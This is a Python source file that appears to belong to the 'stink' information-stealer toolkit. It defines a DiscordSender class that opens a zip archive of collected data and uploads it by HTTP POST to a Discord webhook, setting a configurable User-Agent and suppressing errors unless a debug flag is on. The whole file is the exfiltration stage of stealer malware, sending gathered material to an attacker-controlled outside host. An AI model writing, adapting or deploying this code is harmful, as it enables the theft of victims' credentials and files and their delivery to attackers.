from os import path
from urllib.request import Request, urlopen

from stink.helpers import MultipartFormDataEncoder
from stink.utils.senders.abstract import AbstractSender


class DiscordSender(AbstractSender):

    def __init__(self, webhook: str):
        super().__init__()

        self.__webhook = webhook

    def __get_sender_data(self):

        with open(rf"{path.dirname(self.__storage_path)}\{self.__zip_name}.zip", "rb") as file:
            content_type, body = MultipartFormDataEncoder(self.__errors).encode(
                [],
                [("file", f"{self.__zip_name}.zip", file)]
            )

            return content_type, body, self.__webhook

    def __send_archive(self):

        content_type, body, link = self.__get_sender_data()
        query = Request(method="POST", url=link, data=body)

        query.add_header("User-Agent", self._config.UserAgent)
        query.add_header("Content-Type", content_type)

        urlopen(query)

    def run(self, zip_name: str, storage_path: str, errors: bool):

        self.__zip_name = zip_name
        self.__storage_path = storage_path
        self.__errors = errors

        try:

            self.__send_archive()

        except Exception as e:
            if self.__errors is True: print(f"[Sender]: {repr(e)}")
